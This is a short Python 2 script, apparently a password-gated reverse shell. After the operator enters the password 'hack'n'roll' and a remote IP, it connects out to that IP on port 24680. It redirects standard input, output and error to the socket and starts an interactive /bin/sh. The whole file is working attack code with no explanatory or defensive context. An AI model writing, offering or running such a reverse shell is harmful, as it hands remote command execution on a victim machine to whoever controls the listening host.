#!/usr/bin/python

import socket, subprocess, os, sys
print "password:",
if raw_input().strip() != "hack'n'roll":
	exit()
print "remote IP: ",
MY_IP=raw_input().strip()
MY_PORT=24680
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((MY_IP, MY_PORT))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p=subprocess.call(["/bin/sh", "-i"])
